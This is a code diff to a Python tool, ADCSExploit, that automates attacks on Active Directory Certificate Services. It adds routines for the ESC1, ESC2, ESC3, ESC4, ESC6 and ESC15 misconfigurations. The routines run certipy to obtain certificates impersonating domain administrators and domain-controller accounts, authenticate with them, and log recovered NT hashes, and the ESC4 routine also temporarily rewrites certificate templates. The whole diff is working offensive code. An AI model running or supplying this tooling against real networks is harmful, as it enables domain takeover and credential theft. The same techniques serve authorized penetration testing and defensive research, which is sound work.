@@ -278,7 +278,7 @@ class ADCSExploit:
     
     def __init__(self, domain, username, password=None, ntlm_hash=None, 
                  target=None, lhost=None, use_ldaps=False, ldap_channel_binding=False,
-                 output_dir=".", verbose=False, dns_tcp=False, timeout=100):
+                 output_dir=".", verbose=False, dns_tcp=False, timeout=100, debug=False):
         
         self.domain = domain
         self.domain_parts = domain.split(".")
@@ -292,6 +292,7 @@ class ADCSExploit:
         self.ldap_channel_binding = ldap_channel_binding
         self.dns_tcp = dns_tcp
         self.timeout = timeout
+        self.debug = debug
         
         # Initialize components
         self.logger = Logger(output_dir, verbose)
@@ -596,6 +597,188 @@ class ADCSExploit:
             self.logger.error(f"Error enumerating domain controllers: {e}")
             self.logger.debug(f"Full error: {e}", exc_info=True)
     
+    def request_certificate_with_fallback(self, admin, template, output_suffix="", extra_args=None):
+        """Request certificate with multiple enrollment method fallbacks"""
+        auth_args = self.auth_manager.get_certipy_auth_args()
+        extra_args = extra_args or []
+        
+        base_cmd = [
+            "certipy", "req",
+            *auth_args.split(),
+            "-target", self.target,
+            "-ca", self.ca,
+            "-template", template,
+            "-upn", admin,
+            "-out", f"{template}_{admin}{output_suffix}",
+            "-key-size", "4096"
+        ]
+        
+        # Add extra arguments (like -application-policies for ESC15)
+        base_cmd.extend(extra_args)
+        
+        # Add LDAP options
+        if self.use_ldaps:
+            base_cmd.extend(["-ldap-scheme", "ldaps"])
+            if not self.ldap_channel_binding:
+                base_cmd.append("-no-ldap-channel-binding")
+        else:
+            base_cmd.extend(["-ldap-scheme", "ldap"])
+        
+        # Add debug flag if enabled
+        if self.debug:
+            base_cmd.append("-debug")
+        
+        # Try different enrollment methods in order of preference
+        enrollment_methods = [
+            {"name": "RPC", "args": []},
+            {"name": "Web Enrollment", "args": ["-web"]},
+            {"name": "DCOM", "args": ["-dcom"]}
+        ]
+        
+        # Also try different subject formats for ESC1-like attacks
+        subject_alternatives = [
+            admin,  # Original UPN
+            f"{admin}@{self.domain}" if "@" not in admin else admin,  # UPN format
+            f"CN={admin}",  # CN format
+        ]
+        
+        # Remove duplicates while preserving order
+        subject_alternatives = list(dict.fromkeys(subject_alternatives))
+        
+        # Try each subject alternative with each enrollment method
+        for subject_alt in subject_alternatives:
+            # Update the UPN in the command
+            cmd_with_subject = base_cmd.copy()
+            upn_index = cmd_with_subject.index("-upn") + 1
+            cmd_with_subject[upn_index] = subject_alt
+            
+            for method in enrollment_methods:
+                cmd = cmd_with_subject + method["args"]
+                
+                try:
+                    self.logger.debug(f"Trying {method['name']} enrollment for {subject_alt} using template {template}")
+                    
+                    result = subprocess.run(
+                        cmd,
+                        capture_output=True,
+                        text=True,
+                        cwd=self.output_dir,
+                        timeout=120
+                    )
+                    
+                    if "Got certificate" in result.stdout:
+                        self.logger.info(f"Got certificate for {subject_alt} using template {template} via {method['name']}")
+                        return True, result
+                    elif "Failed to resolve dynamic endpoint" in result.stdout or "ept_s_not_registered" in result.stdout:
+                        self.logger.debug(f"{method['name']} failed with RPC endpoint error, trying next method")
+                        continue
+                    elif "Failed to get DCE RPC connection" in result.stdout:
+                        self.logger.debug(f"{method['name']} failed with RPC connection error, trying next method")
+                        continue
+                    elif "rpc_s_access_denied" in result.stdout:
+                        self.logger.debug(f"{method['name']} failed with access denied for {subject_alt}, trying next subject/method")
+                        continue
+                    elif "The request was not allowed by the security descriptor" in result.stdout:
+                        self.logger.debug(f"Security descriptor denied enrollment for {subject_alt}, trying next subject/method")
+                        continue
+                    else:
+                        self.logger.debug(f"{method['name']} failed for {subject_alt}: {result.stdout[:200]}...")
+                        continue
+                        
+                except subprocess.TimeoutExpired:
+                    self.logger.warning(f"{method['name']} enrollment timed out for {subject_alt}")
+                    continue
+                except Exception as e:
+                    self.logger.debug(f"{method['name']} enrollment failed for {subject_alt}: {e}")
+                    continue
+        
+        # If all methods failed, return the last result for logging
+        return False, result if 'result' in locals() else None
+    
+    def test_template_enrollment(self, template):
+        """Test if we can enroll in a template with current user credentials"""
+        self.logger.info(f"Testing enrollment permissions for template {template}")
+        
+        auth_args = self.auth_manager.get_certipy_auth_args()
+        
+        # Try to enroll with current username first
+        test_cmd = [
+            "certipy", "req",
+            *auth_args.split(),
+            "-target", self.target,
+            "-ca", self.ca,
+            "-template", template,
+            "-out", f"test_{template}"
+        ]
+        
+        # Add LDAP options
+        if self.use_ldaps:
+            test_cmd.extend(["-ldap-scheme", "ldaps"])
+            if not self.ldap_channel_binding:
+                test_cmd.append("-no-ldap-channel-binding")
+        else:
+            test_cmd.extend(["-ldap-scheme", "ldap"])
+        
+        try:
+            result = subprocess.run(
+                test_cmd,
+                capture_output=True,
+                text=True,
+                cwd=self.output_dir,
+                timeout=60
+            )
+            
+            if "Got certificate" in result.stdout:
+                self.logger.info(f"Successfully enrolled in template {template} with current user")
+                # Clean up test certificate
+                test_cert = self.output_dir / f"test_{template}.pfx"
+                if test_cert.exists():
+                    test_cert.unlink()
+                return True
+            elif "rpc_s_access_denied" in result.stdout:
+                self.logger.warning(f"Access denied for template {template} - current user lacks enrollment permissions")
+                return False
+            elif "The request was not allowed by the security descriptor" in result.stdout:
+                self.logger.warning(f"Security descriptor denies enrollment for template {template}")
+                return False
+            else:
+                self.logger.debug(f"Template {template} test enrollment failed: {result.stdout[:200]}...")
+                return False
+                
+        except subprocess.TimeoutExpired:
+            self.logger.warning(f"Template {template} test enrollment timed out")
+            return False
+        except Exception as e:
+            self.logger.error(f"Template {template} test enrollment failed: {e}")
+            return False
+    
+    def is_computer_template(self, template_name):
+        """Determine if a template is likely designed for computer accounts"""
+        computer_indicators = [
+            'computer', 'machine', 'server', 'workstation', 'domain controller',
+            'dc', 'host', 'kerberos', 'rras', 'ipsec', 'router', 'device'
+        ]
+        
+        template_lower = template_name.lower()
+        return any(indicator in template_lower for indicator in computer_indicators)
+    
+    def get_computer_targets(self):
+        """Get list of high-value computer accounts to target"""
+        targets = []
+        
+        # Add domain controllers (highest priority)
+        for dc in self.domain_controllers:
+            # Extract hostname from FQDN
+            hostname = dc.split('.')[0]
+            targets.append(f"{hostname}$")
+        
+        # Add some common server names to try
+        common_servers = ['EXCHANGE', 'SQL', 'WEB', 'FILE', 'PRINT', 'APP', 'DB']
+        for server in common_servers:
+            targets.append(f"{server}$")
+        
+        return targets
+    
     def exploit_esc1(self):
         """Exploit ESC1 vulnerability"""
         if "ESC1" not in self.vulnerable_certificate_templates:
@@ -603,9 +786,482 @@ class ADCSExploit:
         
         self.logger.info("Exploiting ESC1 vulnerability")
         
+        # Categorize templates by type and test enrollment appropriately
+        user_templates = []
+        computer_templates = []
+        
+        for template in self.vulnerable_certificate_templates["ESC1"]:
+            if self.is_computer_template(template):
+                self.logger.info(f"Template {template} detected as computer template - will attempt computer account enrollment")
+                computer_templates.append(template)
+            else:
+                # Test user template enrollment with current user
+                if self.test_template_enrollment(template):
+                    user_templates.append(template)
+                else:
+                    self.logger.warning(f"Skipping user template {template} - no enrollment permissions")
+        
+        if not user_templates and not computer_templates:
+            self.logger.error("No ESC1 templates available for enrollment")
+            return
+        
+        if user_templates:
+            self.logger.info(f"Found {len(user_templates)} enrollable user templates: {', '.join(user_templates)}")
+        if computer_templates:
+            self.logger.info(f"Found {len(computer_templates)} computer templates to attempt: {', '.join(computer_templates)}")
+        
+        # Process computer templates first (often higher impact)
+        for template in computer_templates:
+            self.logger.info(f"Exploiting computer template {template} - targeting high-value computer accounts")
+            
+            # Try high-value computer accounts
+            computer_targets = self.get_computer_targets()
+            for computer in computer_targets:
+                self.logger.info(f"Requesting certificate for computer {computer} using template {template}")
+                
+                # Use computer account UPN format
+                computer_upn = f"{computer}@{self.domain}"
+                success, result = self.request_certificate_with_fallback(
+                    computer_upn, template, f"_{computer.replace('$', '_comp')}"
+                )
+                
+                if success:
+                    # Try to authenticate with the certificate
+                    cert_file = self.output_dir / f"{template}_{computer_upn}_{computer.replace('$', '_comp')}.pfx"
+                    if cert_file.exists():
+                        self.logger.info(f"Got certificate for computer {computer} - this could provide computer account access!")
+                        
+                        # Note: Computer certificates can be used for Silver Tickets, DCSync, etc.
+                        auth_cmd = [
+                            "certipy", "auth",
+                            "-pfx", str(cert_file),
+                            "-domain", self.domain,
+                            "-username", computer,
+                            "-dc-ip", self.target
+                        ]
+                        
+                        try:
+                            auth_result = subprocess.run(
+                                auth_cmd,
+                                capture_output=True,
+                                text=True,
+                                timeout=60
+                            )
+                            
+                            if "Got hash for" in auth_result.stdout:
+                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
+                                if hash_match:
+                                    nt_hash = hash_match.group(1)
+                                    self.logger.info(f"Received NT hash for computer {computer}: {nt_hash}")
+                                    if "DC" in computer.upper() or computer.replace('$', '') in [dc.split('.')[0] for dc in self.domain_controllers]:
+                                        self.logger.info(f"*** DOMAIN CONTROLLER COMPROMISED *** - Computer {computer} NT hash obtained!")
+                        except subprocess.TimeoutExpired:
+                            self.logger.error(f"Certificate authentication timed out for computer {computer}")
+                        except Exception as e:
+                            self.logger.error(f"Certificate authentication failed for computer {computer}: {e}")
+                else:
+                    if result:
+                        self.logger.debug(f"Failed to get certificate for computer {computer}: {result.stdout[:200]}...")
+        
+        # Process user templates
+        for template in user_templates:
+            self.logger.info(f"Exploiting user template {template} - targeting domain administrators")
+            
+            # Try domain admin user accounts
+            for admin in self.domain_admins:
+                self.logger.info(f"Requesting certificate for user {admin} using template {template}")
+                
+                success, result = self.request_certificate_with_fallback(admin, template)
+                
+                if success:
+                    # Try to authenticate with the certificate
+                    cert_file = self.output_dir / f"{template}_{admin}.pfx"
+                    if cert_file.exists():
+                        auth_cmd = [
+                            "certipy", "auth",
+                            "-pfx", str(cert_file),
+                            "-domain", self.domain,
+                            "-username", admin,
+                            "-dc-ip", self.target
+                        ]
+                        
+                        try:
+                            auth_result = subprocess.run(
+                                auth_cmd,
+                                capture_output=True,
+                                text=True,
+                                timeout=60
+                            )
+                            
+                            if "Got hash for" in auth_result.stdout:
+                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
+                                if hash_match:
+                                    nt_hash = hash_match.group(1)
+                                    self.logger.info(f"Received NT hash for {admin}: {nt_hash}")
+                        except subprocess.TimeoutExpired:
+                            self.logger.error(f"Certificate authentication timed out for {admin}")
+                        except Exception as e:
+                            self.logger.error(f"Certificate authentication failed for {admin}: {e}")
+                else:
+                    if result:
+                        self.logger.debug(f"Failed to get certificate for {admin}: {result.stdout[:200]}...")
+                    else:
+                        self.logger.error(f"Failed to get certificate for {admin} - all enrollment methods failed")
+    
+    def exploit_esc2(self):
+        """Exploit ESC2 vulnerability (Any Purpose EKU)"""
+        if "ESC2" not in self.vulnerable_certificate_templates:
+            return
+        
+        self.logger.info("Exploiting ESC2 vulnerability")
+        
         for admin in self.domain_admins:
-            for template in self.vulnerable_certificate_templates["ESC1"]:
-                self.logger.info(f"Requesting certificate for {admin} using template {template}")
+            for template in self.vulnerable_certificate_templates["ESC2"]:
+                self.logger.info(f"Requesting certificate for {admin} using template {template} (ESC2)")
+                
+                # Use UPN with domain for ESC2
+                admin_upn = f"{admin}@{self.domain}" if "@" not in admin else admin
+                success, result = self.request_certificate_with_fallback(
+                    admin_upn, template, "_esc2"
+                )
+                
+                if success:
+                    # Try to authenticate with the certificate
+                    cert_file = self.output_dir / f"{template}_{admin_upn}_esc2.pfx"
+                    if cert_file.exists():
+                        auth_cmd = [
+                            "certipy", "auth",
+                            "-pfx", str(cert_file),
+                            "-domain", self.domain,
+                            "-username", admin,
+                            "-dc-ip", self.target
+                        ]
+                        
+                        try:
+                            auth_result = subprocess.run(
+                                auth_cmd,
+                                capture_output=True,
+                                text=True,
+                                timeout=60
+                            )
+                            
+                            if "Got hash for" in auth_result.stdout:
+                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
+                                if hash_match:
+                                    nt_hash = hash_match.group(1)
+                                    self.logger.info(f"Received NT hash for {admin} via ESC2: {nt_hash}")
+                        except subprocess.TimeoutExpired:
+                            self.logger.error(f"Certificate authentication timed out for {admin} (ESC2)")
+                        except Exception as e:
+                            self.logger.error(f"Certificate authentication failed for {admin} (ESC2): {e}")
+                else:
+                    if result:
+                        self.logger.warning(f"Failed to get certificate for {admin} (ESC2) using all enrollment methods")
+                    else:
+                        self.logger.error(f"Failed to get certificate for {admin} (ESC2) - all enrollment methods failed")
+    
+    def exploit_esc3(self):
+        """Exploit ESC3 vulnerability (Certificate Request Agent)"""
+        if "ESC3" not in self.vulnerable_certificate_templates:
+            return
+        
+        self.logger.info("Exploiting ESC3 vulnerability")
+        
+        # First, get an enrollment agent certificate
+        for template in self.vulnerable_certificate_templates["ESC3"]:
+            self.logger.info(f"Requesting enrollment agent certificate using template {template}")
+            
+            auth_args = self.auth_manager.get_certipy_auth_args()
+            
+            cmd = [
+                "certipy", "req",
+                *auth_args.split(),
+                "-target", self.target,
+                "-ca", self.ca,
+                "-template", template,
+                "-out", f"{template}_agent",
+                "-key-size", "4096"
+            ]
+            
+            # Add LDAP options
+            if self.use_ldaps:
+                cmd.extend(["-ldap-scheme", "ldaps"])
+                if not self.ldap_channel_binding:
+                    cmd.append("-no-ldap-channel-binding")
+            else:
+                cmd.extend(["-ldap-scheme", "ldap"])
+            
+            try:
+                result = subprocess.run(
+                    cmd,
+                    capture_output=True,
+                    text=True,
+                    cwd=self.output_dir,
+                    timeout=120
+                )
+                
+                if "Got certificate" in result.stdout:
+                    self.logger.info(f"Got enrollment agent certificate using template {template}")
+                    
+                    agent_cert = self.output_dir / f"{template}_agent.pfx"
+                    if agent_cert.exists():
+                        # Now use the agent certificate to request certificates for domain admins
+                        for admin in self.domain_admins:
+                            self.logger.info(f"Requesting certificate for {admin} using agent certificate")
+                            
+                            agent_cmd = [
+                                "certipy", "req",
+                                *auth_args.split(),
+                                "-target", self.target,
+                                "-ca", self.ca,
+                                "-template", "User",  # Use User template for on-behalf-of requests
+                                "-on-behalf-of", f"{self.domain}\\{admin}",
+                                "-pfx", str(agent_cert),
+                                "-out", f"{admin}_via_agent",
+                                "-key-size", "4096"
+                            ]
+                            
+                            # Add LDAP options
+                            if self.use_ldaps:
+                                agent_cmd.extend(["-ldap-scheme", "ldaps"])
+                                if not self.ldap_channel_binding:
+                                    agent_cmd.append("-no-ldap-channel-binding")
+                            else:
+                                agent_cmd.extend(["-ldap-scheme", "ldap"])
+                            
+                            try:
+                                agent_result = subprocess.run(
+                                    agent_cmd,
+                                    capture_output=True,
+                                    text=True,
+                                    cwd=self.output_dir,
+                                    timeout=120
+                                )
+                                
+                                if "Got certificate" in agent_result.stdout:
+                                    self.logger.info(f"Got certificate for {admin} via agent certificate (ESC3)")
+                                    
+                                    # Try to authenticate with the certificate
+                                    admin_cert = self.output_dir / f"{admin}_via_agent.pfx"
+                                    if admin_cert.exists():
+                                        auth_cmd = [
+                                            "certipy", "auth",
+                                            "-pfx", str(admin_cert),
+                                            "-domain", self.domain,
+                                            "-username", admin,
+                                            "-dc-ip", self.target
+                                        ]
+                                        
+                                        auth_result = subprocess.run(
+                                            auth_cmd,
+                                            capture_output=True,
+                                            text=True,
+                                            timeout=60
+                                        )
+                                        
+                                        if "Got hash for" in auth_result.stdout:
+                                            hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
+                                            if hash_match:
+                                                nt_hash = hash_match.group(1)
+                                                self.logger.info(f"Received NT hash for {admin} via ESC3: {nt_hash}")
+                                else:
+                                    self.logger.warning(f"Failed to get certificate for {admin} via agent (ESC3): {agent_result.stdout}")
+                                    
+                            except subprocess.TimeoutExpired:
+                                self.logger.error(f"Agent certificate request timed out for {admin} (ESC3)")
+                            except Exception as e:
+                                self.logger.error(f"Agent certificate request failed for {admin} (ESC3): {e}")
+                else:
+                    self.logger.warning(f"Failed to get enrollment agent certificate (ESC3): {result.stdout}")
+                    
+            except subprocess.TimeoutExpired:
+                self.logger.error(f"Enrollment agent certificate request timed out (ESC3)")
+            except Exception as e:
+                self.logger.error(f"Enrollment agent certificate request failed (ESC3): {e}")
+    
+    def exploit_esc4(self):
+        """Exploit ESC4 vulnerability (Template Access Control)"""
+        if "ESC4" not in self.vulnerable_certificate_templates:
+            return
+        
+        self.logger.info("Exploiting ESC4 vulnerability")
+        
+        for template in self.vulnerable_certificate_templates["ESC4"]:
+            self.logger.info(f"Attempting to modify template {template} for ESC4 exploitation")
+            
+            auth_args = self.auth_manager.get_certipy_auth_args()
+            
+            # Save current template configuration
+            save_cmd = [
+                "certipy", "template",
+                *auth_args.split(),
+                "-dc-ip", self.target,
+                "-template", template,
+                "-save-old"
+            ]
+            
+            # Add LDAP options
+            if self.use_ldaps:
+                save_cmd.extend(["-ldap-scheme", "ldaps"])
+                if not self.ldap_channel_binding:
+                    save_cmd.append("-no-ldap-channel-binding")
+            else:
+                save_cmd.extend(["-ldap-scheme", "ldap"])
+            
+            try:
+                # Modify template to be vulnerable to ESC1
+                modify_cmd = [
+                    "certipy", "template",
+                    *auth_args.split(),
+                    "-dc-ip", self.target,
+                    "-template", template,
+                    "-enable-client-auth",
+                    "-enable-san"
+                ]
+                
+                # Add LDAP options
+                if self.use_ldaps:
+                    modify_cmd.extend(["-ldap-scheme", "ldaps"])
+                    if not self.ldap_channel_binding:
+                        modify_cmd.append("-no-ldap-channel-binding")
+                else:
+                    modify_cmd.extend(["-ldap-scheme", "ldap"])
+                
+                modify_result = subprocess.run(
+                    modify_cmd,
+                    capture_output=True,
+                    text=True,
+                    timeout=60
+                )
+                
+                if modify_result.returncode == 0:
+                    self.logger.info(f"Successfully modified template {template} for ESC1 exploitation")
+                    
+                    # Now exploit it like ESC1
+                    for admin in self.domain_admins:
+                        self.logger.info(f"Requesting certificate for {admin} using modified template {template}")
+                        
+                        cmd = [
+                            "certipy", "req",
+                            *auth_args.split(),
+                            "-target", self.target,
+                            "-ca", self.ca,
+                            "-template", template,
+                            "-upn", admin,
+                            "-out", f"{template}_{admin}_esc4",
+                            "-key-size", "4096"
+                        ]
+                        
+                        # Add LDAP options
+                        if self.use_ldaps:
+                            cmd.extend(["-ldap-scheme", "ldaps"])
+                            if not self.ldap_channel_binding:
+                                cmd.append("-no-ldap-channel-binding")
+                        else:
+                            cmd.extend(["-ldap-scheme", "ldap"])
+                        
+                        try:
+                            result = subprocess.run(
+                                cmd,
+                                capture_output=True,
+                                text=True,
+                                cwd=self.output_dir,
+                                timeout=120
+                            )
+                            
+                            if "Got certificate" in result.stdout:
+                                self.logger.info(f"Got certificate for {admin} using modified template (ESC4)")
+                                
+                                # Try to authenticate with the certificate
+                                cert_file = self.output_dir / f"{template}_{admin}_esc4.pfx"
+                                if cert_file.exists():
+                                    auth_cmd = [
+                                        "certipy", "auth",
+                                        "-pfx", str(cert_file),
+                                        "-domain", self.domain,
+                                        "-username", admin,
+                                        "-dc-ip", self.target
+                                    ]
+                                    
+                                    auth_result = subprocess.run(
+                                        auth_cmd,
+                                        capture_output=True,
+                                        text=True,
+                                        timeout=60
+                                    )
+                                    
+                                    if "Got hash for" in auth_result.stdout:
+                                        hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
+                                        if hash_match:
+                                            nt_hash = hash_match.group(1)
+                                            self.logger.info(f"Received NT hash for {admin} via ESC4: {nt_hash}")
+                            else:
+                                self.logger.warning(f"Failed to get certificate for {admin} (ESC4): {result.stdout}")
+                                
+                        except subprocess.TimeoutExpired:
+                            self.logger.error(f"Certificate request timed out for {admin} (ESC4)")
+                        except Exception as e:
+                            self.logger.error(f"Certificate request failed for {admin} (ESC4): {e}")
+                    
+                    # Restore original template configuration
+                    restore_cmd = [
+                        "certipy", "template",
+                        *auth_args.split(),
+                        "-dc-ip", self.target,
+                        "-template", template,
+                        "-restore"
+                    ]
+                    
+                    # Add LDAP options
+                    if self.use_ldaps:
+                        restore_cmd.extend(["-ldap-scheme", "ldaps"])
+                        if not self.ldap_channel_binding:
+                            restore_cmd.append("-no-ldap-channel-binding")
+                    else:
+                        restore_cmd.extend(["-ldap-scheme", "ldap"])
+                    
+                    restore_result = subprocess.run(
+                        restore_cmd,
+                        capture_output=True,
+                        text=True,
+                        timeout=60
+                    )
+                    
+                    if restore_result.returncode == 0:
+                        self.logger.info(f"Successfully restored template {template} configuration")
+                    else:
+                        self.logger.warning(f"Failed to restore template {template} configuration")
+                        
+                else:
+                    self.logger.warning(f"Failed to modify template {template} (ESC4): {modify_result.stderr}")
+                    
+            except subprocess.TimeoutExpired:
+                self.logger.error(f"Template modification timed out for {template} (ESC4)")
+            except Exception as e:
+                self.logger.error(f"Template modification failed for {template} (ESC4): {e}")
+    
+    def exploit_esc6(self):
+        """Exploit ESC6 vulnerability (EDITF_ATTRIBUTESUBJECTALTNAME2)"""
+        if "ESC6" not in self.vulnerabilities:
+            return
+        
+        self.logger.info("Exploiting ESC6 vulnerability")
+        
+        # ESC6 allows us to request certificates with arbitrary SANs
+        # We'll try to get certificates for domain admins by specifying their UPN in SAN
+        for admin in self.domain_admins:
+            # Find a template that allows low-privileged enrollment
+            enrollable_templates = []
+            for esc_type, templates in self.vulnerable_certificate_templates.items():
+                if esc_type != "ESC6":
+                    enrollable_templates.extend(templates)
+            
+            # If no other vulnerable templates, try common templates
+            if not enrollable_templates:
+                enrollable_templates = ["User", "Machine", "WebServer"]
+            
+            for template in enrollable_templates[:3]:  # Try first 3 templates only
+                self.logger.info(f"Requesting certificate for {admin} using template {template} with ESC6")
                 
                 auth_args = self.auth_manager.get_certipy_auth_args()
                 
@@ -615,8 +1271,8 @@ class ADCSExploit:
                     "-target", self.target,
                     "-ca", self.ca,
                     "-template", template,
-                    "-upn", admin,
-                    "-out", f"{template}_{admin}",
+                    "-upn", f"{admin}@{self.domain}",
+                    "-out", f"{template}_{admin}_esc6",
                     "-key-size", "4096"
                 ]
                 
@@ -638,10 +1294,10 @@ class ADCSExploit:
                     )
                     
                     if "Got certificate" in result.stdout:
-                        self.logger.info(f"Got certificate for {admin} using template {template}")
+                        self.logger.info(f"Got certificate for {admin} using template {template} (ESC6)")
                         
                         # Try to authenticate with the certificate
-                        cert_file = self.output_dir / f"{template}_{admin}.pfx"
+                        cert_file = self.output_dir / f"{template}_{admin}_esc6.pfx"
                         if cert_file.exists():
                             auth_cmd = [
                                 "certipy", "auth",
@@ -662,14 +1318,72 @@ class ADCSExploit:
                                 hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
                                 if hash_match:
                                     nt_hash = hash_match.group(1)
-                                    self.logger.info(f"Received NT hash for {admin}: {nt_hash}")
+                                    self.logger.info(f"Received NT hash for {admin} via ESC6: {nt_hash}")
+                                    break  # Success, no need to try other templates
                     else:
-                        self.logger.warning(f"Failed to get certificate for {admin}: {result.stdout}")
+                        self.logger.debug(f"Failed to get certificate for {admin} using template {template} (ESC6): {result.stdout}")
                         
                 except subprocess.TimeoutExpired:
-                    self.logger.error(f"Certificate request timed out for {admin}")
+                    self.logger.error(f"Certificate request timed out for {admin} using template {template} (ESC6)")
                 except Exception as e:
-                    self.logger.error(f"Certificate request failed for {admin}: {e}")
+                    self.logger.error(f"Certificate request failed for {admin} using template {template} (ESC6): {e}")
+    
+    def exploit_esc15(self):
+        """Exploit ESC15 vulnerability (EKUwu - Schema Version 1 Templates)"""
+        if "ESC15" not in self.vulnerable_certificate_templates:
+            return
+        
+        self.logger.info("Exploiting ESC15 vulnerability (EKUwu)")
+        
+        for admin in self.domain_admins:
+            for template in self.vulnerable_certificate_templates["ESC15"]:
+                self.logger.info(f"Requesting certificate for {admin} using template {template} with Application Policies injection (ESC15)")
+                
+                # Use UPN with domain for ESC15
+                admin_upn = f"{admin}@{self.domain}" if "@" not in admin else admin
+                success, result = self.request_certificate_with_fallback(
+                    admin_upn, template, "_esc15", 
+                    ["-application-policies", "Client Authentication"]
+                )
+                
+                if success:
+                    # Try to authenticate with the certificate
+                    cert_file = self.output_dir / f"{template}_{admin_upn}_esc15.pfx"
+                    if cert_file.exists():
+                        auth_cmd = [
+                            "certipy", "auth",
+                            "-pfx", str(cert_file),
+                            "-domain", self.domain,
+                            "-username", admin,
+                            "-dc-ip", self.target
+                        ]
+                        
+                        try:
+                            auth_result = subprocess.run(
+                                auth_cmd,
+                                capture_output=True,
+                                text=True,
+                                timeout=60
+                            )
+                            
+                            if "Got hash for" in auth_result.stdout:
+                                hash_match = re.search(r"Got hash for '.*': (\w+:\w+)", auth_result.stdout)
+                                if hash_match:
+                                    nt_hash = hash_match.group(1)
+                                    self.logger.info(f"Received NT hash for {admin} via ESC15: {nt_hash}")
+                            
+                            # Also note LDAP shell capability
+                            self.logger.info(f"Certificate for {admin} can be used for LDAP authentication (ESC15)")
+                            
+                        except subprocess.TimeoutExpired:
+                            self.logger.error(f"Certificate authentication timed out for {admin} (ESC15)")
+                        except Exception as e:
+                            self.logger.error(f"Certificate authentication failed for {admin} (ESC15): {e}")
+                else:
+                    if result:
+                        self.logger.warning(f"Failed to get certificate for {admin} (ESC15) using all enrollment methods")
+                    else:
+                        self.logger.error(f"Failed to get certificate for {admin} (ESC15) - all enrollment methods failed")
     
     def exploit_esc8(self):
         """Exploit ESC8 vulnerability"""
@@ -730,13 +1444,16 @@ class ADCSExploit:
         # Certificate template exploits
         certificate_exploits = {
             "ESC1": self.exploit_esc1,
-            # Add more ESC exploits here as needed
+            "ESC2": self.exploit_esc2,
+            "ESC3": self.exploit_esc3,
+            "ESC4": self.exploit_esc4,
+            "ESC15": self.exploit_esc15,
         }
         
         # Environment/CA exploits
         environment_exploits = {
+            "ESC6": self.exploit_esc6,
             "ESC8": self.exploit_esc8,
-            # Add more environment exploits here
         }
         
         # Run template-based exploits
@@ -824,6 +1541,8 @@ def main():
                        help='Use TCP for DNS queries')
     parser.add_argument('-v', '--verbose', action='store_true',
                        help='Enable verbose output')
+    parser.add_argument('--debug', action='store_true',
+                       help='Enable debug mode for certipy commands')
     parser.add_argument('--use-kerberos', action='store_true',
                        help='Force Kerberos authentication when using password')
     
@@ -860,7 +1579,8 @@ def main():
             output_dir=args.output,
             verbose=args.verbose,
             dns_tcp=args.dns_tcp,
-            timeout=args.timeout
+            timeout=args.timeout,
+            debug=args.debug
         )
         
         # Set Kerberos ticket if provided
